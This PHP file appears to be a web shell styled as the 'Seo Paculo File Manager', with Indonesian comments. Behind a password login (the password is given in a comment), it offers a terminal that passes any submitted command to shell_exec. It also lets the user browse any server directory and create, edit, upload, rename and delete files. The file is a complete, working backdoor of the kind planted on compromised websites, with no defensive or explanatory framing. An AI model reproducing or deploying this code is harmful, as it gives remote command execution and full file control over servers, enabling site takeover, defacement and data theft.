<?php
ob_start();
session_start();

// Password hashed dengan bcrypt (password: password123)
define('PASSWORD_HASHED', '$2y$10$.LC4Uf1OqLe5e9uW.8NgDeOKgMbTx9Q9l6oPDst6ZN8fCQ5LFd5se');

// Proses login
if (isset($_POST['password'])) {
    if (password_verify($_POST['password'], PASSWORD_HASHED)) {
        $_SESSION['authenticated'] = true;
        echo '<audio autoplay><source src="https://e.top4top.io/m_3437wq49m0.mp3" type="audio/mpeg"></audio>';
    } else {
        $login_error = "Password salah!";
    }
}

// Proses logout
if (isset($_POST['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    // Tampilkan form login jika belum terautentikasi
    echo '
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Seo Paculo - Premium Access</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                background: #000;
                font-family: "Montserrat", "Segoe UI", sans-serif;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                overflow: hidden;
                position: relative;
            }
            
            .luxury-bg {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: 
                    radial-gradient(circle at 20% 80%, rgba(255, 215, 0, 0.15) 0%, transparent 50%),
                    radial-gradient(circle at 80% 20%, rgba(255, 215, 0, 0.1) 0%, transparent 50%),
                    radial-gradient(circle at 40% 40%, rgba(255, 215, 0, 0.08) 0%, transparent 50%);
                z-index: -2;
            }
            
            .gold-grid {
                position: absolute;
                width: 100%;
                height: 100%;
                background-image: 
                    linear-gradient(rgba(255, 215, 0, 0.03) 1px, transparent 1px),
                    linear-gradient(90deg, rgba(255, 215, 0, 0.03) 1px, transparent 1px);
                background-size: 50px 50px;
                z-index: -1;
                opacity: 0.3;
            }
            
            .login-container {
                position: relative;
                width: 100%;
                max-width: 500px;
                padding: 20px;
            }
            
            .login-card {
                background: linear-gradient(145deg, rgba(10, 10, 10, 0.95), rgba(20, 20, 20, 0.95));
                backdrop-filter: blur(15px);
                border-radius: 25px;
                padding: 50px 40px;
                box-shadow: 
                    0 20px 50px rgba(0, 0, 0, 0.8),
                    0 0 0 1px rgba(255, 215, 0, 0.1),
                    0 0 40px rgba(255, 215, 0, 0.2),
                    inset 0 0 20px rgba(255, 215, 0, 0.05);
                text-align: center;
                position: relative;
                overflow: hidden;
                border: 1px solid rgba(255, 215, 0, 0.15);
                transform-style: preserve-3d;
                perspective: 1000px;
            }
            
            .login-card::before {
                content: "";
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: conic-gradient(from 0deg, transparent, rgba(255, 215, 0, 0.3), transparent);
                animation: rotate 10s linear infinite;
                z-index: 0;
            }
            
            .login-card::after {
                content: "";
                position: absolute;
                inset: 3px;
                background: linear-gradient(145deg, rgba(10, 10, 10, 0.95), rgba(20, 20, 20, 0.95));
                border-radius: 22px;
                z-index: 1;
            }
            
            @keyframes rotate {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            
            .card-content {
                position: relative;
                z-index: 2;
            }
            
            .logo-container {
                margin-bottom: 30px;
                position: relative;
            }
            
            .logo-frame {
                width: 140px;
                height: 140px;
                margin: 0 auto 20px;
                border-radius: 50%;
                background: linear-gradient(145deg, rgba(30, 30, 30, 0.9), rgba(10, 10, 10, 0.9));
                display: flex;
                align-items: center;
                justify-content: center;
                position: relative;
                border: 2px solid rgba(255, 215, 0, 0.3);
                box-shadow: 
                    0 0 30px rgba(255, 215, 0, 0.3),
                    inset 0 0 20px rgba(255, 215, 0, 0.1);
                animation: pulse-glow 4s ease-in-out infinite;
            }
            
            @keyframes pulse-glow {
                0%, 100% { box-shadow: 0 0 30px rgba(255, 215, 0, 0.3), inset 0 0 20px rgba(255, 215, 0, 0.1); }
                50% { box-shadow: 0 0 50px rgba(255, 215, 0, 0.5), inset 0 0 30px rgba(255, 215, 0, 0.2); }
            }
            
            .main-logo {
                max-width: 100px;
                height: auto;
                filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.7));
            }
            
            .logo-text {
                font-size: 36px;
                background: linear-gradient(to right, #FFD700, #FFAA00, #FFD700, #FFC107);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                font-weight: 800;
                margin-bottom: 8px;
                letter-spacing: 2px;
                text-transform: uppercase;
                position: relative;
                display: inline-block;
            }
            
            .logo-text::after {
                content: "";
                position: absolute;
                bottom: -5px;
                left: 50%;
                transform: translateX(-50%);
                width: 100px;
                height: 3px;
                background: linear-gradient(to right, transparent, #FFD700, #FFAA00, #FFD700, transparent);
                border-radius: 2px;
            }
            
            .subtitle {
                color: rgba(255, 215, 0, 0.7);
                margin-bottom: 35px;
                font-size: 14px;
                letter-spacing: 3px;
                text-transform: uppercase;
                font-weight: 300;
            }
            
            .form-group {
                position: relative;
                margin-bottom: 30px;
            }
            
            .form-input {
                width: 100%;
                padding: 18px 25px;
                background: rgba(5, 5, 5, 0.8);
                border: 2px solid rgba(255, 215, 0, 0.2);
                border-radius: 15px;
                color: #FFD700;
                font-size: 16px;
                transition: all 0.4s ease;
                outline: none;
                font-weight: 500;
                letter-spacing: 1px;
            }
            
            .form-input:focus {
                border-color: rgba(255, 215, 0, 0.8);
                box-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
                background: rgba(10, 10, 10, 0.9);transform: translateY(-3px);
            }
            
            .form-input::placeholder {
                color: rgba(255, 215, 0, 0.4);
            }
            
            .password-container {
                position: relative;
            }
            
            .toggle-password {
                position: absolute;
                right: 20px;
                top: 50%;
                transform: translateY(-50%);
                background: none;
                border: none;
                color: rgba(255, 215, 0, 0.6);
                cursor: pointer;
                font-size: 18px;
                transition: color 0.3s;
            }
            
            .toggle-password:hover {
                color: #FFD700;
            }
            
            .login-btn {
                width: 100%;
                padding: 20px;
                background: linear-gradient(135deg, #FFD700 0%, #D4AF37 30%, #B8860B 70%, #966919 100%);
                border: none;
                border-radius: 15px;
                color: #000;
                font-size: 18px;
                font-weight: 700;
                cursor: pointer;
                transition: all 0.4s ease;
                text-transform: uppercase;
                letter-spacing: 2px;
                margin-top: 10px;
                position: relative;
                overflow: hidden;
                box-shadow: 0 10px 30px rgba(255, 215, 0, 0.3);
            }
            
            .login-btn:hover {
                transform: translateY(-5px);
                box-shadow: 0 15px 40px rgba(255, 215, 0, 0.5);
                background: linear-gradient(135deg, #FFE44C 0%, #E6C158 30%, #DAA520 70%, #B8860B 100%);
            }
            
            .login-btn:active {
                transform: translateY(-2px);
            }
            
            .login-btn::before {
                content: "";
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
                transition: 0.5s;
            }
            
            .login-btn:hover::before {
                left: 100%;
            }
            
            .error-message {
                color: #ff6b6b;
                background: rgba(255, 107, 107, 0.1);
                padding: 15px;
                border-radius: 12px;
                margin-bottom: 25px;
                border: 1px solid rgba(255, 107, 107, 0.3);
                animation: shake 0.5s ease-in-out;
                font-weight: 500;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
            }
            
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                25% { transform: translateX(-10px); }
                75% { transform: translateX(10px); }
            }
            
            .golden-particles {
                position: absolute;
                width: 100%;
                height: 100%;
                top: 0;
                left: 0;
                pointer-events: none;
                z-index: -1;
            }
            
            .golden-particle {
                position: absolute;
                background: radial-gradient(circle, rgba(255, 215, 0, 0.8), rgba(255, 215, 0, 0));
                border-radius: 50%;
                animation: particleFloat 15s infinite linear;
                opacity: 0;
            }
            
            @keyframes particleFloat {
                0% {
                    transform: translateY(100vh) rotate(0deg) scale(0);
                    opacity: 0;
                }
                20% {
                    opacity: 0.8;
                }
                80% {
                    opacity: 0.8;
                }
                100% {
                    transform: translateY(-100px) rotate(720deg) scale(1);
                    opacity: 0;
                }
            }
            
            .footer-text {
                margin-top: 30px;
                color: rgba(255, 215, 0, 0.5);
                font-size: 12px;
                letter-spacing: 1px;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
            }
            
            .gold-icon {
                color: #FFD700;
                animation: spin 8s linear infinite;
            }
            
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            
            @media (max-width: 480px) {
                .login-card {
                    padding: 30px 20px;
                }
                
                .logo-frame {
                    width: 120px;
                    height: 120px;
                }
                
                .main-logo {
                    max-width: 80px;
                }
                
                .logo-text {
                    font-size: 28px;
                }
                
                .form-input {
                    padding: 15px 20px;
                }
            }
            
            .loading {
                display: none;
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                z-index: 10;
            }
            
            .loading-spinner {
                width: 50px;
                height: 50px;
                border: 5px solid rgba(255, 215, 0, 0.2);
                border-top: 5px solid #FFD700;
                border-radius: 50%;
                animation: spin 1s linear infinite;
            }
            
            .floating-badge {
                position: absolute;
                top: 20px;
                right: 20px;
                background: linear-gradient(135deg, #FFD700, #B8860B);
                color: #000;
                padding: 8px 15px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: 700;
                letter-spacing: 1px;
                box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
                z-index: 3;
                animation: bounce 2s infinite;
            }
            
            @keyframes bounce {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-5px); }
            }
        </style>
    </head>
    <body>
        <div class="luxury-bg"></div>
        <div class="gold-grid"></div>
        <div class="golden-particles">';
    
    // Generate particles with different sizes
    for ($i = 0; $i < 30; $i++) {
        $size = rand(5, 20);
        $left = rand(0, 100);
        $delay = rand(0, 15);
        $duration = rand(10, 20);
        echo '<div class="golden-particle" style="width: ' . $size . 'px; height: ' . $size . 'px; left: ' . $left . '%; animation-delay: ' . $delay . 's; animation-duration: ' . $duration . 's;"></div>';
    }
    
    echo '</div>
        <div class="login-container">
            <div class="login-card">
                <div class="floating-badge">VIP ACCESS</div>
                <div class="card-content">
                    <div class="logo-container">
                        <div class="logo-frame">
                            <img src="https://j.top4top.io/p_3640ccf4d1.png" alt="Seo Paculo Logo" class="main-logo">
                        </div>
                        <h1 class="logo-text">SEO PACULO</h1>
                        <p class="subtitle"><i class="fas fa-crown"></i> Premium Access Portal <i class="fas fa-crown"></i></p>
                    </div>';
                
    if (isset($login_error)) {
        echo '<div class="error-message"><i class="fas fa-exclamation-triangle"></i> ' . htmlspecialchars($login_error) . '</div>';
    }
    
    echo '<form method="post" id="loginForm">
                    <div class="form-group">
                        <div class="password-container">
                            <input type="password" name="password" id="password" class="form-input" placeholder="ENTER ACCESS PASSWORD" required autofocus>
                            <button type="button" class="toggle-password" id="togglePassword">
                                <i class="fas fa-eye"></i>
                            </button>
                        </div>
                    </div>
                    <button type="submit" class="login-btn" id="loginButton">
                        <span id="buttonText">ACCESS SYSTEM</span>
                        <div class="loading" id="loadingSpinner">
                            <div class="loading-spinner"></div>
                        </div>
                    </button>
                </form>
                <p class="footer-text">
                    <i class="fas fa-shield-alt gold-icon"></i>
                    © ' . date('Y') . ' Seo Paculo | Secure Access Portal
                    <i class="fas fa-lock gold-icon"></i>
                </p>
            </div>
        </div>
        <script>
            document.addEventListener("DOMContentLoaded", function() {
                const togglePassword = document.getElementById("togglePassword");
                const passwordInput = document.getElementById("password");
                const loginForm = document.getElementById("loginForm");
                const loginButton = document.getElementById("loginButton");
                const buttonText = document.getElementById("buttonText");
                const loadingSpinner = document.getElementById("loadingSpinner");
                
                // Toggle password visibility
                togglePassword.addEventListener("click", function() {
                    const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
                    passwordInput.setAttribute("type", type);
                    this.innerHTML = type === "password" ? \'<i class="fas fa-eye"></i>\' : \'<i class="fas fa-eye-slash"></i>\';
                });
                
                // Focus effect
                passwordInput.addEventListener("focus", function() {
                    this.parentElement.style.transform = "scale(1.02)";
                });
                
                passwordInput.addEventListener("blur", function() {
                    this.parentElement.style.transform = "scale(1)";
                });
                
                // Form submission with loading effect
                loginForm.addEventListener("submit", function(e) {
                    if(passwordInput.value.trim() !== "") {
                        buttonText.style.opacity = "0";
                        loadingSpinner.style.display = "block";
                        loginButton.style.cursor = "wait";
                        
                        // Simulate loading for better UX
                        setTimeout(() => {
                            buttonText.style.opacity = "1";
                            loadingSpinner.style.display = "none";
                            loginButton.style.cursor = "pointer";
                        }, 2000);
                    }
                });
                
                // Add floating particles on click
                document.addEventListener("click", function(e) {
                    if(e.target.closest(".login-card")) return;
                    
                    const particle = document.createElement("div");
                    particle.className = "golden-particle";
                    particle.style.left = e.clientX + "px";
                    particle.style.top = e.clientY + "px";
                    particle.style.width = Math.random() * 15 + 5 + "px";
                    particle.style.height = particle.style.width;
                    particle.style.animationDuration = Math.random() * 10 + 5 + "s";
                    
                    document.querySelector(".golden-particles").appendChild(particle);
                    
                    setTimeout(() => {
                        particle.remove();
                    }, 15000);
                });
                
                // Add keyboard effect
                document.addEventListener("keydown", function(e) {
                    if(document.activeElement === passwordInput) {
                        const card = document.querySelector(".login-card");
                        card.style.transform = "perspective(1000px) rotateY(" + (Math.random() * 2 - 1) + "deg) rotateX(" + (Math.random() * 2 - 1) + "deg)";
                        
                        setTimeout(() => {
                            card.style.transform = "perspective(1000px) rotateY(0deg) rotateX(0deg)";
                        }, 100);
                    }
                });
                
                // Add ripple effect to button
                loginButton.addEventListener("click", function(e) {
                    const rect = this.getBoundingClientRect();
                    const x = e.clientX - rect.left;
                    const y = e.clientY - rect.top;
                    
                    const ripple = document.createElement("span");
                    ripple.style.position = "absolute";
                    ripple.style.background = "rgba(255, 255, 255, 0.4)";
                    ripple.style.borderRadius = "50%";
                    ripple.style.transform = "scale(0)";
                    ripple.style.animation = "ripple 0.6s linear";
                    ripple.style.left = x + "px";
                    ripple.style.top = y + "px";
                    ripple.style.width = "20px";
                    ripple.style.height = "20px";
                    
                    this.appendChild(ripple);
                    
                    setTimeout(() => {
                        ripple.remove();
                    }, 600);
                });
                
                // Add CSS for ripple animation
                const style = document.createElement("style");
                style.textContent = `
                    @keyframes ripple {
                        to {
                            transform: scale(10);
                            opacity: 0;
                        }
                    }
                `;
                document.head.appendChild(style);
                
                // Auto-focus password field
                passwordInput.focus();
            });
        </script>
    </body>
    </html>';
    exit;
}

// KODE SETELAH LOGIN BERHASIL
// Tangani direktori saat ini lewat parameter get "dir"
if (isset($_GET['dir'])) {
    $dir = realpath($_GET['dir']);
    if ($dir === false || !is_dir($dir)) {
        $dir = realpath(__DIR__);
    }
} else {
    $dir = realpath(__DIR__);
}

$message = '';

function safeName($name) {
    return preg_replace('/[^a-zA-Z0-9_\-\.]/', '', $name);
}

// --- Terminal Shell ---
$terminalOutput = '';
if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    // Eksekusi perintah shell
    $terminalOutput = shell_exec($cmd . ' 2>&1');
}

// CREATE FOLDER
if (isset($_POST['newfolder']) && trim($_POST['newfolder']) !== '') {
    $folderName = safeName(trim($_POST['newfolder']));
    if ($folderName && !file_exists("$dir/$folderName")) {
        if (@mkdir("$dir/$folderName")) {
            $message = "Folder '$folderName' berhasil dibuat.";
        } else {
            $message = "Gagal membuat folder '$folderName'.";
        }
    } else {
        $message = "Nama folder tidak valid atau sudah ada.";
    }
}

// CREATE FILE
if (isset($_POST['newfile']) && trim($_POST['newfile']) !== '') {
    $fileName = safeName(trim($_POST['newfile']));
    $filePath = "$dir/$fileName";
    if ($fileName && !file_exists($filePath)) {
        if (file_put_contents($filePath, "") !== false) {
            $message = "File '$fileName' berhasil dibuat.";
        } else {
            $message = "Gagal membuat file '$fileName'.";
        }
    } else {
        $message = "Nama file tidak valid atau sudah ada.";
    }
}

// DELETE FILE/FOLDER
if (isset($_GET['delete'])) {
    $deleteName = safeName($_GET['delete']);
    $deletePath = "$dir/$deleteName";
    if (file_exists($deletePath)) {
        if (is_dir($deletePath)) {
            if (@rmdir($deletePath)) {
                $message = "Folder '$deleteName' berhasil dihapus.";
            } else {
                $message = "Folder '$deleteName' tidak kosong atau gagal dihapus.";
            }
        } else {
            if (@unlink($deletePath)) {
                $message = "File '$deleteName' berhasil dihapus.";
            } else {
                $message = "Gagal menghapus file '$deleteName'.";
            }
        }
    } else {
        $message = "File/folder tidak ditemukan.";
    }
}

// RENAME FILE/FOLDER
if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $oldName = safeName($_POST['rename_old']);
    $newName = safeName($_POST['rename_new']);
    $oldPath = "$dir/$oldName";
    $newPath = "$dir/$newName";

    if ($oldName && $newName && file_exists($oldPath) && !file_exists($newPath)) {
        if (@rename($oldPath, $newPath)) {
            $message = "Berhasil rename '$oldName' menjadi '$newName'.";
        } else {
            $message = "Gagal rename.";
        }
    } else {
        $message = "Nama baru sudah ada, tidak valid, atau file lama tidak ditemukan.";
    }
}

// EDIT FILE - Simpan perubahan
if (isset($_POST['edit_file']) && isset($_POST['edit_content'])) {
    $editFile = safeName($_POST['edit_file']);
    $editPath = "$dir/$editFile";
    if (file_exists($editPath) && is_file($editPath)) {
        if (file_put_contents($editPath, $_POST['edit_content']) !== false) {
            $message = "File '$editFile' berhasil disimpan.";
        } else {
            $message = "Gagal menyimpan file.";
        }
    } else {
        $message = "File tidak ditemukan.";
    }
}

// UPLOAD FILE
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
    $uploadName = basename($_FILES['upload_file']['name']);
    $uploadName = safeName($uploadName);
    $uploadPath = "$dir/$uploadName";

    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $uploadPath)) {
        $message = "File '$uploadName' berhasil diupload ke folder saat ini.";
    } else {
        $message = "Gagal upload file.";
    }
}

// Jika ingin edit, ambil isi file dulu
$editFile = null;
$editContent = '';
if (isset($_GET['edit'])) {
    $editFile = safeName($_GET['edit']);
    $editPath = "$dir/$editFile";
    if (file_exists($editPath) && is_file($editPath)) {
        $editContent = file_get_contents($editPath);
    } else {
        $editFile = null;
        $message = "File untuk diedit tidak ditemukan.";
    }
}

$files = scandir($dir);
$parentDir = dirname($dir);

// Fungsi buat breadcrumb
function makeBreadcrumb($dir) {
    $parts = explode(DIRECTORY_SEPARATOR, $dir);
    $path = '';
    $breadcrumbs = [];
    if (DIRECTORY_SEPARATOR === '\\') {
        $drive = array_shift($parts);
        $path = $drive . DIRECTORY_SEPARATOR;
        $breadcrumbs[] = ['name' => $drive, 'path' => $path];
    } else {
        $breadcrumbs[] = ['name' => '/', 'path' => DIRECTORY_SEPARATOR];
    }
    foreach ($parts as $part) {
        if ($part === '') continue;
        $path = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $part;
        $breadcrumbs[] = ['name' => $part, 'path' => $path];
    }
    return $breadcrumbs;
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<title>Seo Paculo File Manager v2.00</title>
<style>
  body {
    background: #0A0A0A;
    color: #FFD700;
    font-family: monospace;
    padding: 2rem;
    max-width: 900px;
    margin: auto;
    background-image: radial-gradient(circle at 1px 1px, rgba(255, 215, 0, 0.1) 1px, transparent 0);
    background-size: 30px 30px;
  }
  h2 {
    color: #FFD700;
    text-align: center;
    text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
  }
  table {
    width: 100%;
    border-collapse: collapse;
    margin-bottom: 1rem;
  }
  th, td {
    border: 1px solid #FFD700;
    padding: 6px 10px;
    text-align: left;
  }
  th {
    background: rgba(255, 215, 0, 0.1);
    color: #FFD700;
  }
  tr:nth-child(even) {
    background: rgba(255, 215, 0, 0.05);
  }
  a {
    color: #FFD700;
    text-decoration: none;
  }
  a:hover {
    text-decoration: underline;
    color: #FFAA00;
  }
  form {
    margin-bottom: 1rem;
    display: flex;
    gap: 1rem;
  }
  input[type=text], textarea {
    background: #000;
    border: 2px solid #FFD700;
    color: #FFD700;
    padding: 0.5rem 1rem;
    border-radius: 8px;
    outline: none;
    font-family: monospace;
  }
  input[type=text] {
    flex-grow: 1;
  }
  button {
    background: linear-gradient(45deg, #FFD700, #B8860B);
    border: none;
    color: #000;
    font-weight: bold;
    padding: 0.5rem 1rem;
    border-radius: 8px;
    cursor: pointer;
  }
  button:hover {
    background: linear-gradient(45deg, #FFE44C, #DAA520);
    transform: translateY(-2px);
  }
  textarea {
    width: 100%;
    height: 300px;
    resize: vertical;
  }
  .msg {
    margin-bottom: 1rem;
    color: #FFD700;
    background: rgba(255, 215, 0, 0.1);
    padding: 10px;
    border-radius: 8px;
    border-left: 4px solid #FFD700;
  }
  .actions form {
    display: inline-block;
    margin: 0;
  }
  form.upload-form {
    margin-bottom: 1.5rem;
    display: flex;
    align-items: center;
    gap: 1rem;
  }
  form.upload-form label[for="upload_file"] {
    background: linear-gradient(45deg, #FFD700, #B8860B);
    padding: 0.6rem 1.2rem;
    border-radius: 8px;
    color: #000;
    font-weight: bold;
    cursor: pointer;
    user-select: none;
  }
  form.upload-form input[type="file"] {
    display: none;
  }
  form.upload-form #file_name {
    color: #FFD700;
    font-style: italic;
    min-width: 200px;
  }
  nav.breadcrumb {
    margin-bottom: 1.5rem;
    font-size: 0.9rem;
  }
  nav.breadcrumb a {
    color: #FFD700;
    text-decoration: none;
    margin-right: 0.4rem;
  }
  nav.breadcrumb a:hover {
    text-decoration: underline;
    color: #FFAA00;
  }
  nav.breadcrumb span.separator {
    margin-right: 0.4rem;
    color: #FFD700;
  }
  .terminal-box {
    margin: 2rem 0;
    background: #000;
    padding: 1rem;
    border: 1px solid #FFD700;
    border-radius: 8px;
    box-shadow: 0 0 15px rgba(255, 215, 0, 0.2);
  }
  .terminal-output {
    color: #FFD700;
    background: #000;
    padding: 0.8rem;
    border-radius: 4px;
    overflow-x: auto;
    white-space: pre-wrap;
    margin-top: 0.75rem;
    border: 1px solid rgba(255, 215, 0, 0.3);
  }
  .header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 2rem;
    padding-bottom: 1rem;
    border-bottom: 2px solid #FFD700;
  }
  .logout-btn {
    background: linear-gradient(45deg, #B8860B, #8B6914);
    border: none;
    color: #FFD700;
    padding: 0.5rem 1.5rem;
    border-radius: 8px;
    cursor: pointer;
    font-weight: bold;
  }
  .logout-btn:hover {
    background: linear-gradient(45deg, #DAA520, #B8860B);
    color: #000;
  }
  .page-logo {
    max-width: 180px;
    height: auto;
    margin-bottom: 15px;
    filter: drop-shadow(0 0 8px rgba(255, 215, 0, 0.5));
  }
  .brand-title {
    font-size: 24px;
    background: linear-gradient(to right, #FFD700, #FFAA00, #FFD700);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;background-clip: text;
    font-weight: bold;
    margin-bottom: 5px;
  }
  .golden-glow {
    box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
  }
</style>
</head>
<body>

<div class="header">
    <div style="display: flex; align-items: center; gap: 15px;">
        <img src="https://j.top4top.io/p_3640ccf4d1.png" alt="Seo Paculo Logo" class="page-logo" style="max-width: 80px;">
        <div>
            <h2 style="margin:0; font-size: 22px;" class="brand-title">SEO PACULO FILE MANAGER</h2>
            <p style="color:rgba(255, 215, 0, 0.7); margin:5px 0 0 0;">Advanced Management System v2.0</p>
        </div>
    </div>
    <form method="post">
        <button type="submit" name="logout" class="logout-btn">Logout</button>
    </form>
</div>

<?php if($message): ?>
  <div class="msg"><?= htmlspecialchars($message) ?></div>
<?php endif; ?>

<!-- Breadcrumb direktori -->
<nav class="breadcrumb">
  <?php
  $breadcrumbs = makeBreadcrumb($dir);
  $lastIndex = count($breadcrumbs) - 1;
  foreach ($breadcrumbs as $i => $crumb) {
      if ($i !== $lastIndex) {
          echo '<a href="?dir=' . urlencode($crumb['path']) . '">' . htmlspecialchars($crumb['name']) . '</a><span class="separator">/</span>';
      } else {
          echo '<span>' . htmlspecialchars($crumb['name']) . '</span>';
      }
  }
  ?>
</nav>

<?php if (!$editFile): ?>
<!-- Terminal Shell -->
<div class="terminal-box">
  <form method="post" style="display: flex; gap: 0.5rem; margin-bottom: 0.75rem;">
    <span style="color:#FFAA00;">seo-paculo@shell:</span>
    <span style="color:#FFD700;"><?php echo htmlspecialchars(basename($dir)); ?>$</span>
    <input type="text" name="cmd" placeholder="Masukkan perintah (misal: ls -la, whoami, pwd)..." style="background:#000; color:#FFD700; border:1px solid #FFD700; flex-grow:1; padding:0.4rem;" autocomplete="off" />
    <button type="submit" style="background:linear-gradient(45deg, #FFD700, #B8860B); color:#000; font-weight:bold; padding:0.4rem 0.8rem; border:none; border-radius:4px;">Execute</button>
  </form>
  <?php if ($terminalOutput !== ''): ?>
    <pre class="terminal-output"><?= htmlspecialchars($terminalOutput) ?></pre>
  <?php endif; ?>
</div>
<?php endif; ?>

<?php if ($editFile): ?>
  <form method="post">
    <input type="hidden" name="edit_file" value="<?= htmlspecialchars($editFile) ?>" />
    <textarea name="edit_content"><?= htmlspecialchars($editContent) ?></textarea>
    <button type="submit">Save File</button>
    <a href="<?= $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir) ?>" style="color:#FFD700; margin-left: 1rem;">Cancel</a>
  </form>
<?php else: ?>

<form method="post" style="margin-bottom:1rem;">
  <input type="text" name="newfolder" placeholder="Nama folder baru..." autocomplete="off" />
  <button type="submit">Create Folder</button>
</form>

<form method="post" style="margin-bottom:1.5rem;">
  <input type="text" name="newfile" placeholder="Nama file baru..." autocomplete="off" />
  <button type="submit">Create File</button>
</form>

<!-- Upload File -->
<form method="post" enctype="multipart/form-data" class="upload-form">
  <label for="upload_file">Select File</label>
  <input type="file" name="upload_file" id="upload_file" required />
  <span id="file_name">No file selected</span>
  <button type="submit">Upload File</button>
</form>

<table>
  <thead>
    <tr>
      <th>Name</th>
      <th>Type</th>
      <th>Size (Bytes)</th>
      <th>Actions</th>
    </tr>
  </thead>
  <tbody>
    <?php foreach ($files as $file): ?>
      <?php if ($file === '.') continue; ?>
      <tr>
        <td>
          <?php if (is_dir("$dir/$file")): ?>
            <a href="?dir=<?= urlencode(realpath("$dir/$file")) ?>"><?= htmlspecialchars($file) ?></a>
          <?php else: ?>
            <?= htmlspecialchars($file) ?>
          <?php endif; ?>
        </td>
        <td><?= is_dir("$dir/$file") ? '<b>Folder</b>' : 'File' ?></td>
        <td><?= is_file("$dir/$file") ? filesize("$dir/$file") : '-' ?></td>
        <td class="actions" style="white-space: nowrap;">
          <?php if ($file !== '..'): ?>
          <?php if (!is_dir("$dir/$file")): ?>
          <a href="?edit=<?= urlencode($file) . '&dir=' . urlencode($dir) ?>">Edit</a> |
          <?php else: ?>
          -
          <?php endif; ?>
          <a href="?delete=<?= urlencode($file) . '&dir=' . urlencode($dir) ?>" onclick="return confirm('Yakin ingin hapus <?= htmlspecialchars($file) ?>?')">Delete</a> |
          <form method="post" style="display:inline;">
            <input type="hidden" name="rename_old" value="<?= htmlspecialchars($file) ?>" />
            <input type="text" name="rename_new" placeholder="New name" required style="width: 120px;" />
            <button type="submit" title="Rename">Rename</button>
          </form>
          <?php else: ?>
            -
          <?php endif; ?>
        </td>
      </tr>
    <?php endforeach; ?>
  </tbody>
</table>

<?php endif; ?>

<footer style="text-align:center; color:rgba(255, 215, 0, 0.6); margin-top:3rem; padding-top:1rem; border-top:1px solid rgba(255, 215, 0, 0.3);">
  Seo Paculo File Manager v2.00 | Premium File Management System By Reza | &copy; <?php echo date('Y'); ?>
</footer>

<script>
  const inputFile = document.getElementById('upload_file');
  const fileNameSpan = document.getElementById('file_name');
  inputFile.addEventListener('change', () => {
    if (inputFile.files.length > 0) {
      fileNameSpan.textContent = inputFile.files[0].name;
    } else {
      fileNameSpan.textContent = 'No file selected';
    }
  });
  
  // Add golden glow effect to inputs on focus
  document.querySelectorAll('input[type="text"], textarea').forEach(input => {
    input.addEventListener('focus', function() {
      this.classList.add('golden-glow');
    });
    
    input.addEventListener('blur', function() {
      this.classList.remove('golden-glow');
    });
  });
</script>

</body>
</html>
